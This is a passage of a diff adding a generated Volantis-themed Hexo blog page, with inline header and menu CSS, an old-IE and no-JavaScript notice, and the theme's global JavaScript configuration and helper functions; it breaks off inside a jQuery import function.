+.l_header .switcher >li {
+  height: 48px;
+  transition: all 0.28s ease;
+  -webkit-transition: all 0.28s ease;
+  -khtml-transition: all 0.28s ease;
+  -moz-transition: all 0.28s ease;
+  -o-transition: all 0.28s ease;
+  -ms-transition: all 0.28s ease;
+  margin: 2px;
+}
+@media screen and (max-width: 500px) {
+  .l_header .switcher >li {
+    margin: 0 1px;
+    height: 48px;
+  }
+}
+.l_header .switcher >li >a {
+  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
+  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
+  display: -ms-flexbox /* TWEENER - IE 10 */;
+  display: -webkit-flex /* NEW - Chrome */;
+  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
+  display: flex;
+  justify-content: center;
+  -webkit-justify-content: center;
+  -khtml-justify-content: center;
+  -moz-justify-content: center;
+  -o-justify-content: center;
+  -ms-justify-content: center;
+  align-items: center;
+  width: 48px;
+  height: 48px;
+  padding: 0.85em 1.1em;
+  border-radius: 100px;
+  -webkit-border-radius: 100px;
+  border: none;
+  transition: all 0.28s ease;
+  -webkit-transition: all 0.28s ease;
+  -khtml-transition: all 0.28s ease;
+  -moz-transition: all 0.28s ease;
+  -o-transition: all 0.28s ease;
+  -ms-transition: all 0.28s ease;
+  color: #3dd9b6;
+}
+.l_header .switcher >li >a:hover {
+  border: none;
+}
+.l_header .switcher >li >a.active,
+.l_header .switcher >li >a:active {
+  border: none;
+  background: var(--color-site-bg);
+}
+@media screen and (max-width: 500px) {
+  .l_header .switcher >li >a {
+    width: 36px;
+    height: 48px;
+  }
+}
+.l_header .nav-sub .switcher {
+  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
+  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
+  display: -ms-flexbox /* TWEENER - IE 10 */;
+  display: -webkit-flex /* NEW - Chrome */;
+  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
+  display: flex;
+}
+.l_header .m_search {
+  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
+  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
+  display: -ms-flexbox /* TWEENER - IE 10 */;
+  display: -webkit-flex /* NEW - Chrome */;
+  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
+  display: flex;
+  height: 64px;
+  width: 240px;
+  transition: all 0.28s ease;
+  -webkit-transition: all 0.28s ease;
+  -khtml-transition: all 0.28s ease;
+  -moz-transition: all 0.28s ease;
+  -o-transition: all 0.28s ease;
+  -ms-transition: all 0.28s ease;
+}
+@media screen and (max-width: 1024px) {
+  .l_header .m_search {
+    width: 44px;
+    min-width: 44px;
+  }
+  .l_header .m_search input::placeholder {
+    opacity: 0;
+    -webkit-opacity: 0;
+    -moz-opacity: 0;
+  }
+  .l_header .m_search:hover {
+    width: 240px;
+  }
+  .l_header .m_search:hover input::placeholder {
+    opacity: 1;
+    -webkit-opacity: 1;
+    -moz-opacity: 1;
+  }
+}
+@media screen and (min-width: 500px) {
+  .l_header .m_search:hover .input {
+    width: 100%;
+  }
+  .l_header .m_search:hover .input::placeholder {
+    opacity: 1;
+    -webkit-opacity: 1;
+    -moz-opacity: 1;
+  }
+}
+@media screen and (max-width: 500px) {
+  .l_header .m_search {
+    min-width: 0;
+  }
+  .l_header .m_search input::placeholder {
+    opacity: 1;
+    -webkit-opacity: 1;
+    -moz-opacity: 1;
+  }
+}
+.l_header .m_search .form {
+  position: relative;
+  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
+  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
+  display: -ms-flexbox /* TWEENER - IE 10 */;
+  display: -webkit-flex /* NEW - Chrome */;
+  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
+  display: flex;
+  width: 100%;
+  align-items: center;
+}
+.l_header .m_search .icon {
+  position: absolute;
+  width: 36px;
+  left: 5px;
+  color: var(--color-meta);
+}
+@media screen and (max-width: 500px) {
+  .l_header .m_search .icon {
+    display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
+    display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
+    display: none;
+  }
+}
+.l_header .m_search .input {
+  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
+  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
+  display: block;
+  padding-top: 8px;
+  padding-bottom: 8px;
+  line-height: 1.3;
+  width: 100%;
+  color: var(--color-text);
+  background: #fafafa;
+  box-shadow: none;
+  -webkit-box-shadow: none;
+  box-sizing: border-box;
+  -webkit-box-sizing: border-box;
+  -moz-box-sizing: border-box;
+  padding-left: 40px;
+  font-size: 0.875rem;
+  border-radius: 8px;
+  -webkit-border-radius: 8px;
+  border: none;
+  transition: all 0.28s ease;
+  -webkit-transition: all 0.28s ease;
+  -khtml-transition: all 0.28s ease;
+  -moz-transition: all 0.28s ease;
+  -o-transition: all 0.28s ease;
+  -ms-transition: all 0.28s ease;
+}
+@media screen and (min-width: 500px) {
+  .l_header .m_search .input:focus {
+    box-shadow: 0 4px 8px 0px rgba(0,0,0,0.1);
+    -webkit-box-shadow: 0 4px 8px 0px rgba(0,0,0,0.1);
+  }
+}
+@media screen and (max-width: 500px) {
+  .l_header .m_search .input {
+    background: var(--color-block);
+    padding-left: 8px;
+    border: none;
+  }
+  .l_header .m_search .input:hover,
+  .l_header .m_search .input:focus {
+    border: none;
+  }
+}
+@media (max-width: 500px) {
+  .l_header .m_search {
+    left: 0;
+    width: 0;
+    overflow: hidden;
+    position: absolute;
+    background: #fff;
+    transition: all 0.28s ease;
+    -webkit-transition: all 0.28s ease;
+    -khtml-transition: all 0.28s ease;
+    -moz-transition: all 0.28s ease;
+    -o-transition: all 0.28s ease;
+    -ms-transition: all 0.28s ease;
+  }
+  .l_header .m_search .input {
+    border-radius: 32px;
+    -webkit-border-radius: 32px;
+    margin-left: 16px;
+    padding-left: 16px;
+  }
+  .l_header.z_search-open .m_search {
+    width: 100%;
+  }
+  .l_header.z_search-open .m_search .input {
+    width: calc(100% - 120px);
+  }
+}
+ul.m-pc >li>a {
+  color: inherit;
+  border-bottom: 2px solid transparent;
+}
+ul.m-pc >li>a:active,
+ul.m-pc >li>a.active {
+  border-bottom: 2px solid #3dd9b6;
+}
+ul.m-pc li:hover >ul.list-v,
+ul.list-v li:hover >ul.list-v {
+  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
+  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
+  display: block;
+}
+ul.nav-list-h {
+  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
+  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
+  display: -ms-flexbox /* TWEENER - IE 10 */;
+  display: -webkit-flex /* NEW - Chrome */;
+  display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
+  display: flex;
+  align-items: stretch;
+}
+ul.nav-list-h>li {
+  position: relative;
+  justify-content: center;
+  -webkit-justify-content: center;
+  -khtml-justify-content: center;
+  -moz-justify-content: center;
+  -o-justify-content: center;
+  -ms-justify-content: center;
+  height: 100%;
+  line-height: 2.4;
+  border-radius: 4px;
+  -webkit-border-radius: 4px;
+}
+ul.nav-list-h>li >a {
+  -webkit-font-smoothing: antialiased;
+  -moz-osx-font-smoothing: grayscale;
+  font-weight: 600;
+}
+ul.list-v {
+  z-index: 1;
+  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
+  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
+  display: none;
+  position: absolute;
+  background: var(--color-card);
+  box-shadow: 0 2px 4px 0px rgba(0,0,0,0.08), 0 4px 8px 0px rgba(0,0,0,0.08), 0 8px 16px 0px rgba(0,0,0,0.08);
+  -webkit-box-shadow: 0 2px 4px 0px rgba(0,0,0,0.08), 0 4px 8px 0px rgba(0,0,0,0.08), 0 8px 16px 0px rgba(0,0,0,0.08);
+  margin-top: -6px;
+  border-radius: 4px;
+  -webkit-border-radius: 4px;
+  padding: 8px 0;
+}
+ul.list-v.show {
+  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
+  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
+  display: block;
+}
+ul.list-v hr {
+  margin-top: 8px;
+  margin-bottom: 8px;
+}
+ul.list-v >li {
+  white-space: nowrap;
+  word-break: keep-all;
+}
+ul.list-v >li.header {
+  font-size: 0.78125rem;
+  font-weight: bold;
+  line-height: 2em;
+  color: var(--color-meta);
+  margin: 8px 16px 4px;
+}
+ul.list-v >li.header i {
+  margin-right: 8px;
+}
+ul.list-v >li ul {
+  margin-left: 0;
+  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
+  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
+  display: none;
+  margin-top: -40px;
+}
+ul.list-v .aplayer-container {
+  min-height: 64px;
+  padding: 6px 16px;
+}
+ul.list-v >li>a {
+  transition: all 0.28s ease;
+  -webkit-transition: all 0.28s ease;
+  -khtml-transition: all 0.28s ease;
+  -moz-transition: all 0.28s ease;
+  -o-transition: all 0.28s ease;
+  -ms-transition: all 0.28s ease;
+  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
+  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
+  display: block;
+  color: var(--color-list);
+  font-size: 0.875rem;
+  font-weight: bold;
+  line-height: 36px;
+  padding: 0 20px 0 16px;
+  text-overflow: ellipsis;
+  margin: 0 4px;
+  border-radius: 4px;
+  -webkit-border-radius: 4px;
+}
+@media screen and (max-width: 1024px) {
+  ul.list-v >li>a {
+    line-height: 40px;
+  }
+}
+ul.list-v >li>a >i {
+  margin-right: 8px;
+}
+ul.list-v >li>a:active,
+ul.list-v >li>a.active {
+  color: var(--color-list-hl);
+}
+ul.list-v >li>a:hover {
+  color: var(--color-list-hl);
+  background: var(--color-site-bg);
+}
+.l_header .menu >ul>li>a {
+  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
+  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
+  display: block;
+  padding: 0 8px;
+}
+.l_header .menu >ul>li>a >i {
+  margin-right: 4px;
+}
+.l_header ul.nav-list-h>li {
+  color: var(--color-list);
+  line-height: 64px;
+}
+.l_header ul.nav-list-h>li >a {
+  max-height: 64px;
+  overflow: hidden;
+  color: inherit;
+}
+.l_header ul.nav-list-h>li >a:active,
+.l_header ul.nav-list-h>li >a.active {
+  color: #3dd9b6;
+}
+.l_header ul.nav-list-h>li:hover>a {
+  color: var(--color-list-hl);
+}
+.l_header ul.nav-list-h>li i.music {
+  animation: rotate-effect 1.5s linear infinite;
+  -webkit-animation: rotate-effect 1.5s linear infinite;
+  -khtml-animation: rotate-effect 1.5s linear infinite;
+  -moz-animation: rotate-effect 1.5s linear infinite;
+  -o-animation: rotate-effect 1.5s linear infinite;
+  -ms-animation: rotate-effect 1.5s linear infinite;
+}
+@-moz-keyframes rotate-effect {
+  0% {
+    transform: rotate(0);
+    -webkit-transform: rotate(0);
+    -khtml-transform: rotate(0);
+    -moz-transform: rotate(0);
+    -o-transform: rotate(0);
+    -ms-transform: rotate(0);
+  }
+  25% {
+    transform: rotate(90deg);
+    -webkit-transform: rotate(90deg);
+    -khtml-transform: rotate(90deg);
+    -moz-transform: rotate(90deg);
+    -o-transform: rotate(90deg);
+    -ms-transform: rotate(90deg);
+  }
+  50% {
+    transform: rotate(180deg);
+    -webkit-transform: rotate(180deg);
+    -khtml-transform: rotate(180deg);
+    -moz-transform: rotate(180deg);
+    -o-transform: rotate(180deg);
+    -ms-transform: rotate(180deg);
+  }
+  75% {
+    transform: rotate(270deg);
+    -webkit-transform: rotate(270deg);
+    -khtml-transform: rotate(270deg);
+    -moz-transform: rotate(270deg);
+    -o-transform: rotate(270deg);
+    -ms-transform: rotate(270deg);
+  }
+  100% {
+    transform: rotate(360deg);
+    -webkit-transform: rotate(360deg);
+    -khtml-transform: rotate(360deg);
+    -moz-transform: rotate(360deg);
+    -o-transform: rotate(360deg);
+    -ms-transform: rotate(360deg);
+  }
+}
+@-webkit-keyframes rotate-effect {
+  0% {
+    transform: rotate(0);
+    -webkit-transform: rotate(0);
+    -khtml-transform: rotate(0);
+    -moz-transform: rotate(0);
+    -o-transform: rotate(0);
+    -ms-transform: rotate(0);
+  }
+  25% {
+    transform: rotate(90deg);
+    -webkit-transform: rotate(90deg);
+    -khtml-transform: rotate(90deg);
+    -moz-transform: rotate(90deg);
+    -o-transform: rotate(90deg);
+    -ms-transform: rotate(90deg);
+  }
+  50% {
+    transform: rotate(180deg);
+    -webkit-transform: rotate(180deg);
+    -khtml-transform: rotate(180deg);
+    -moz-transform: rotate(180deg);
+    -o-transform: rotate(180deg);
+    -ms-transform: rotate(180deg);
+  }
+  75% {
+    transform: rotate(270deg);
+    -webkit-transform: rotate(270deg);
+    -khtml-transform: rotate(270deg);
+    -moz-transform: rotate(270deg);
+    -o-transform: rotate(270deg);
+    -ms-transform: rotate(270deg);
+  }
+  100% {
+    transform: rotate(360deg);
+    -webkit-transform: rotate(360deg);
+    -khtml-transform: rotate(360deg);
+    -moz-transform: rotate(360deg);
+    -o-transform: rotate(360deg);
+    -ms-transform: rotate(360deg);
+  }
+}
+@-o-keyframes rotate-effect {
+  0% {
+    transform: rotate(0);
+    -webkit-transform: rotate(0);
+    -khtml-transform: rotate(0);
+    -moz-transform: rotate(0);
+    -o-transform: rotate(0);
+    -ms-transform: rotate(0);
+  }
+  25% {
+    transform: rotate(90deg);
+    -webkit-transform: rotate(90deg);
+    -khtml-transform: rotate(90deg);
+    -moz-transform: rotate(90deg);
+    -o-transform: rotate(90deg);
+    -ms-transform: rotate(90deg);
+  }
+  50% {
+    transform: rotate(180deg);
+    -webkit-transform: rotate(180deg);
+    -khtml-transform: rotate(180deg);
+    -moz-transform: rotate(180deg);
+    -o-transform: rotate(180deg);
+    -ms-transform: rotate(180deg);
+  }
+  75% {
+    transform: rotate(270deg);
+    -webkit-transform: rotate(270deg);
+    -khtml-transform: rotate(270deg);
+    -moz-transform: rotate(270deg);
+    -o-transform: rotate(270deg);
+    -ms-transform: rotate(270deg);
+  }
+  100% {
+    transform: rotate(360deg);
+    -webkit-transform: rotate(360deg);
+    -khtml-transform: rotate(360deg);
+    -moz-transform: rotate(360deg);
+    -o-transform: rotate(360deg);
+    -ms-transform: rotate(360deg);
+  }
+}
+@keyframes rotate-effect {
+  0% {
+    transform: rotate(0);
+    -webkit-transform: rotate(0);
+    -khtml-transform: rotate(0);
+    -moz-transform: rotate(0);
+    -o-transform: rotate(0);
+    -ms-transform: rotate(0);
+  }
+  25% {
+    transform: rotate(90deg);
+    -webkit-transform: rotate(90deg);
+    -khtml-transform: rotate(90deg);
+    -moz-transform: rotate(90deg);
+    -o-transform: rotate(90deg);
+    -ms-transform: rotate(90deg);
+  }
+  50% {
+    transform: rotate(180deg);
+    -webkit-transform: rotate(180deg);
+    -khtml-transform: rotate(180deg);
+    -moz-transform: rotate(180deg);
+    -o-transform: rotate(180deg);
+    -ms-transform: rotate(180deg);
+  }
+  75% {
+    transform: rotate(270deg);
+    -webkit-transform: rotate(270deg);
+    -khtml-transform: rotate(270deg);
+    -moz-transform: rotate(270deg);
+    -o-transform: rotate(270deg);
+    -ms-transform: rotate(270deg);
+  }
+  100% {
+    transform: rotate(360deg);
+    -webkit-transform: rotate(360deg);
+    -khtml-transform: rotate(360deg);
+    -moz-transform: rotate(360deg);
+    -o-transform: rotate(360deg);
+    -ms-transform: rotate(360deg);
+  }
+}
+.menu-phone li ul.list-v {
+  right: calc(100% - 0.5 * 16px);
+}
+.menu-phone li ul.list-v ul {
+  right: calc(100% - 0.5 * 16px);
+}
+#wrapper {
+  max-width: 1080px;
+  margin: auto;
+}
+@media screen and (min-width: 2048px) {
+  #wrapper {
+    max-width: 55vw;
+  }
+}
+#wrapper .menu {
+  -webkit-box-flex: 1;
+  -moz-box-flex: 1;
+  -webkit-flex: 1 1;
+  -ms-flex: 1 1;
+  flex: 1 1;
+  margin: 0 16px 0 0;
+}
+#wrapper .menu .list-v ul {
+  left: calc(100% - 0.5 * 16px);
+}
+.menu-phone {
+  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
+  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
+  display: none;
+  margin-top: 16px;
+  right: 8px;
+  transition: all 0.28s ease;
+  -webkit-transition: all 0.28s ease;
+  -khtml-transition: all 0.28s ease;
+  -moz-transition: all 0.28s ease;
+  -o-transition: all 0.28s ease;
+  -ms-transition: all 0.28s ease;
+}
+.menu-phone ul {
+  right: calc(100% - 0.5 * 16px);
+}
+@media screen and (max-width: 500px) {
+  .menu-phone {
+    display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
+    display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
+    display: block;
+  }
+}
+.l_header {
+  max-width: 65vw;
+  left: calc((100% - 65vw) * 0.5);
+  border-bottom-left-radius: 8px;
+  border-bottom-right-radius: 8px;
+}
+@media screen and (max-width: 2048px) {
+  .l_header {
+    max-width: 1112px;
+    left: calc((100% - 1112px) * 0.5);
+  }
+}
+@media screen and (max-width: 1112px) {
+  .l_header {
+    left: 0;
+    border-radius: 0;
+    -webkit-border-radius: 0;
+    max-width: 100%;
+  }
+}
+@media screen and (max-width: 500px) {
+  .l_header .container {
+    margin-left: 0;
+    margin-right: 0;
+  }
+  .l_header #wrapper .nav-main .title {
+    padding-left: 16px;
+    padding-right: 16px;
+  }
+  .l_header #wrapper .nav-sub {
+    width: 100%;
+  }
+  .l_header #wrapper .nav-sub .title {
+    overflow-y: scroll;
+    margin-top: 2px;
+    padding: 8px 16px;
+  }
+  .l_header #wrapper .switcher {
+    display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
+    display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
+    display: -ms-flexbox /* TWEENER - IE 10 */;
+    display: -webkit-flex /* NEW - Chrome */;
+    display: flex /* NEW, Spec - Opera 12.1, Firefox 20+ */;
+    display: flex;
+    margin-right: 8px;
+  }
+  .l_header .menu {
+    display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
+    display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
+    display: none;
+  }
+}
+@media screen and (max-width: 500px) {
+  .list-v li {
+    max-width: 270px;
+  }
+}
+#u-search {
+  display: -webkit-box /* OLD - iOS 6-, Safari 3.1-6 */;
+  display: -moz-box /* OLD - Firefox 19- (buggy but mostly works) */;
+  display: none;
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  padding: 60px 20px;
+  z-index: 1001;
+}
+@media screen and (max-width: 680px) {
+  #u-search {
+    padding: 0px;
+  }
+}
+
+  </style>
+  <link rel="stylesheet" href="/css/style.css" media="print" onload="this.media='all';this.onload=null">
+  <noscript><link rel="stylesheet" href="/css/style.css"></noscript>
+  
+<script>
+if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMode))
+    document.write(
+	'<style>'+
+		'html{'+
+			'overflow-x: hidden !important;'+
+			'overflow-y: hidden !important;'+
+		'}'+
+		'.kill-ie{'+
+			'text-align:center;'+
+			'height: 100%;'+
+			'margin-top: 15%;'+
+			'margin-bottom: 5500%;'+
+		'}'+
+    '.kill-t{'+
+      'font-size: 2rem;'+
+    '}'+
+    '.kill-c{'+
+      'font-size: 1.2rem;'+
+    '}'+
+		'#l_header,#l_body{'+
+			'display: none;'+
+		'}'+
+	'</style>'+
+    '<div class="kill-ie">'+
+        `<span class="kill-t"><b>Sorry, your browser cannot access this site</b></span><br/>`+
+        `<span class="kill-c">Microsoft has terminated support for Internet Explorer (IE) 10 and earlier versions in 2016. <br/>There are great security risks to continue using it. Please use contemporary mainstream browsers to access.</span><br/>`+
+        `<a target="_blank" rel="noopener" href="https://blogs.windows.com/windowsexperience/2021/05/19/the-future-of-internet-explorer-on-windows-10-is-in-microsoft-edge/"><strong>Learn more ></strong></a>`+
+    '</div>');
+</script>
+
+
+<noscript>
+	<style>
+		html{
+			overflow-x: hidden !important;
+			overflow-y: hidden !important;
+		}
+		.kill-noscript{
+			text-align:center;
+			height: 100%;
+			margin-top: 15%;
+			margin-bottom: 5500%;
+		}
+    .kill-t{
+      font-size: 2rem;
+    }
+    .kill-c{
+      font-size: 1.2rem;
+    }
+		#l_header,#l_body{
+			display: none;
+		}
+	</style>
+    <div class="kill-noscript">
+        <span class="kill-t"><b>Sorry, your browser cannot access this site</b></span><br/>
+        <span class="kill-c">This page requires browser support (enable) JavaScript</span><br/>
+        <a target="_blank" rel="noopener" href="https://www.baidu.com/s?wd=启用JavaScript"><strong>Learn more ></strong></a>
+    </div>
+</noscript>
+
+
+  <script>
+  /************这个文件存放不需要重载的全局变量和全局函数*********/
+  window.volantis = {}; // volantis 全局变量
+  volantis.debug = "env"; // 调试模式
+  volantis.dom = {}; // 页面Dom see: /source/js/app.js etc.
+
+  volantis.GLOBAL_CONFIG ={
+    debug: "env",
+    cdn: {"js":{"app":"/js/app.js","parallax":"/js/plugins/parallax.js","rightMenu":"/js/plugins/rightMenu.js","rightMenus":"/js/plugins/rightMenus.js","sites":"/js/plugins/tags/sites.js","friends":"/js/plugins/tags/friends.js","contributors":"/js/plugins/tags/contributors.js","search":"/js/search/hexo.js"},"css":{"style":"/css/style.css"}},
+    default: {"avatar":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/avatar/round/3442075.svg","link":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/link/8f277b4ee0ecd.svg","cover":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/cover/76b86c0226ffd.svg","image":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/image/2659360.svg"},
+    lastupdate: new Date(1728902004789),
+    sidebar: {
+      for_page: ["blogger","category","tagcloud","donate"],
+      for_post: ["toc"],
+      webinfo: {
+        lastupd: {
+          enable: true,
+          friendlyShow: true
+        },
+        runtime: {
+          data: "2020/01/01",
+          unit: "天"
+        }
+      }
+    },
+    plugins: {
+      message: {"enable":true,"css":"https://unpkg.com/volantis-static@0.0.1654736714924/libs/izitoast/dist/css/iziToast.min.css","js":"https://unpkg.com/volantis-static@0.0.1654736714924/libs/izitoast/dist/js/iziToast.min.js","icon":{"default":"fa-solid fa-info-circle light-blue","quection":"fa-solid fa-question-circle light-blue"},"time":{"default":5000,"quection":20000},"position":"topRight","transitionIn":"bounceInLeft","transitionOut":"fadeOutRight","titleColor":"var(--color-text)","messageColor":"var(--color-text)","backgroundColor":"var(--color-card)","zindex":2147483647,"copyright":{"enable":true,"title":"知识共享许可协议","message":"请遵守 CC BY-NC-SA 4.0 协议。","icon":"far fa-copyright light-blue"},"aplayer":{"enable":true,"play":"fa-solid fa-play","pause":"fa-solid fa-pause"},"rightmenu":{"enable":true,"notice":true}},
+      fancybox: {"css":"https://unpkg.com/volantis-static@0.0.1654736714924/libs/@fancyapps/ui/dist/fancybox.css","js":"https://unpkg.com/volantis-static@0.0.1654736714924/libs/@fancyapps/ui/dist/fancybox.umd.js"},
+      
+      
+      
+    }
+  }
+
+  /******************** volantis.EventListener ********************************/
+  // 事件监听器 see: /source/js/app.js
+  volantis.EventListener = {}
+  // 这里存放pjax切换页面时将被移除的事件监听器
+  volantis.EventListener.list = []
+  //构造方法
+  function volantisEventListener(type, f, ele) {
+    this.type = type
+    this.f = f
+    this.ele = ele
+  }
+  // 移除事件监听器
+  volantis.EventListener.remove = () => {
+    volantis.EventListener.list.forEach(function (i) {
+      i.ele.removeEventListener(i.type, i.f, false)
+    })
+    volantis.EventListener.list = []
+  }
+  /******************** volantis.dom.$ ********************************/
+  // 注：这里没有选择器，也没有forEach一次只处理一个dom，这里重新封装主题常用的dom方法，返回的是dom对象，对象包含了以下方法，同时保留dom的原生API
+  function volantisDom(ele) {
+    if (!ele) ele = document.createElement("div")
+    this.ele = ele;
+    // ==============================================================
+    this.ele.find = (c) => {
+      let q = this.ele.querySelector(c)
+      if (q)
+        return new volantisDom(q)
+    }
+    // ==============================================================
+    this.ele.hasClass = (c) => {
+      return this.ele.className.match(new RegExp('(\\s|^)' + c + '(\\s|$)'));
+    }
+    this.ele.addClass = (c) => {
+      this.ele.classList.add(c);
+      return this.ele
+    }
+    this.ele.removeClass = (c) => {
+      this.ele.classList.remove(c);
+      return this.ele
+    }
+    this.ele.toggleClass = (c) => {
+      if (this.ele.hasClass(c)) {
+        this.ele.removeClass(c)
+      } else {
+        this.ele.addClass(c)
+      }
+      return this.ele
+    }
+    // ==============================================================
+    // 参数 r 为 true 表示pjax切换页面时事件监听器将被移除，false不移除
+    this.ele.on = (c, f, r = 1) => {
+      this.ele.addEventListener(c, f, false)
+      if (r) {
+        volantis.EventListener.list.push(new volantisEventListener(c, f, this.ele))
+      }
+      return this.ele
+    }
+    this.ele.click = (f, r) => {
+      this.ele.on("click", f, r)
+      return this.ele
+    }
+    this.ele.scroll = (f, r) => {
+      this.ele.on("scroll", f, r)
+      return this.ele
+    }
+    // ==============================================================
+    this.ele.html = (c) => {
+      // if(c=== undefined){
+      //   return this.ele.innerHTML
+      // }else{
+      this.ele.innerHTML = c
+      return this.ele
+      // }
+    }
+    // ==============================================================
+    this.ele.hide = (c) => {
+      this.ele.style.display = "none"
+      return this.ele
+    }
+    this.ele.show = (c) => {
+      this.ele.style.display = "block"
+      return this.ele
+    }
+    // ==============================================================
+    return this.ele
+  }
+  volantis.dom.$ = (ele) => {
+    return !!ele ? new volantisDom(ele) : null;
+  }
+  /******************** RunItem ********************************/
+  function RunItem() {
+    this.list = []; // 存放回调函数
+    this.start = () => {
+      for (var i = 0; i < this.list.length; i++) {
+        this.list[i].run();
+      }
+    };
+    this.push = (fn, name, setRequestAnimationFrame = true) => {
+      let myfn = fn
+      if (setRequestAnimationFrame) {
+        myfn = ()=>{
+          volantis.requestAnimationFrame(fn)
+        }
+      }
+      var f = new Item(myfn, name);
+      this.list.push(f);
+    };
+    this.remove = (name) =>{
+      for (let index = 0; index < this.list.length; index++) {
+        const e = this.list[index];
+        if (e.name == name) {
+          this.list.splice(index,1);
+        }
+      }
+    }
+    // 构造一个可以run的对象
+    function Item(fn, name) {
+      // 函数名称
+      this.name = name || fn.name;
+      // run方法
+      this.run = () => {
+        try {
+          fn()
+        } catch (error) {
+          console.log(error);
+        }
+      };
+    }
+  }
+  /******************** Pjax ********************************/
+  // /layout/_plugins/pjax/index.ejs
+  // volantis.pjax.send(callBack[,"callBackName"]) 传入pjax:send回调函数
+  // volantis.pjax.push(callBack[,"callBackName"]) 传入pjax:complete回调函数
+  // volantis.pjax.error(callBack[,"callBackName"]) 传入pjax:error回调函数
+  volantis.pjax = {};
+  volantis.pjax.method = {
+    complete: new RunItem(),
+    error: new RunItem(),
+    send: new RunItem(),
+  };
+  volantis.pjax = Object.assign(volantis.pjax, {
+    push: volantis.pjax.method.complete.push,
+    error: volantis.pjax.method.error.push,
+    send: volantis.pjax.method.send.push,
+  });
+  /******************** RightMenu ********************************/
+  // volantis.rightmenu.handle(callBack[,"callBackName"]) 外部菜单项控制
+  // 可在 volantis.mouseEvent 处获取右键事件
+  volantis.rightmenu = {};
+  volantis.rightmenu.method = {
+    handle: new RunItem(),
+  }
+  volantis.rightmenu = Object.assign(volantis.rightmenu, {
+    handle: volantis.rightmenu.method.handle.push,
+  });
+  /********************  Dark Mode  ********************************/
+  // /layout/_partial/scripts/darkmode.ejs
+  // volantis.dark.mode 当前模式 dark or light
+  // volantis.dark.toggle() 暗黑模式触发器
+  // volantis.dark.push(callBack[,"callBackName"]) 传入触发器回调函数
+  volantis.dark = {};
+  volantis.dark.method = {
+    toggle: new RunItem(),
+  };
+  volantis.dark = Object.assign(volantis.dark, {
+    push: volantis.dark.method.toggle.push,
+  });
+  /********************  Message  ********************************/
+  // VolantisApp.message
+  /********************  isMobile  ********************************/
+  // /source/js/app.js
+  // volantis.isMobile
+  // volantis.isMobileOld
+  /********************脚本动态加载函数********************************/
+  // volantis.js(src, cb)  cb 可以传入onload回调函数 或者 JSON对象 例如: volantis.js("src", ()=>{}) 或 volantis.js("src", {defer:true,onload:()=>{}})
+  // volantis.css(src)
+
+  // 返回Promise对象，如下方法同步加载资源，这利于处理文件资源之间的依赖关系，例如：APlayer 需要在 MetingJS 之前加载
+  // (async () => {
+  //     await volantis.js("...theme.plugins.aplayer.js.aplayer...")
+  //     await volantis.js("...theme.plugins.aplayer.js.meting...")
+  // })();
+
+  // 已经加入了setTimeout
+  volantis.js = (src, cb) => {
+    return new Promise(resolve => {
+      setTimeout(function () {
+        var HEAD = document.getElementsByTagName("head")[0] || document.documentElement;
+        var script = document.createElement("script");
+        script.setAttribute("type", "text/javascript");
+        if (cb) {
+          if (JSON.stringify(cb)) {
+            for (let p in cb) {
+              if (p == "onload") {
+                script[p] = () => {
+                  cb[p]()
+                  resolve()
+                }
+              } else {
+                script[p] = cb[p]
+                script.onload = resolve
+              }
+            }
+          } else {
+            script.onload = () => {
+              cb()
+              resolve()
+            };
+          }
+        } else {
+          script.onload = resolve
+        }
+        script.setAttribute("src", src);
+        HEAD.appendChild(script);
+      });
+    });
+  }
+  volantis.css = (src) => {
+    return new Promise(resolve => {
+      setTimeout(function () {
+        var link = document.createElement('link');
+        link.rel = "stylesheet";
+        link.href = src;
+        link.onload = resolve;
+        document.getElementsByTagName("head")[0].appendChild(link);
+      });
+    });
+  }
+  /********************按需加载的插件********************************/
+  // volantis.import.jQuery().then(()=>{})
+  volantis.import = {
+    jQuery: () => {
+      if (typeof jQuery == "undefined") {
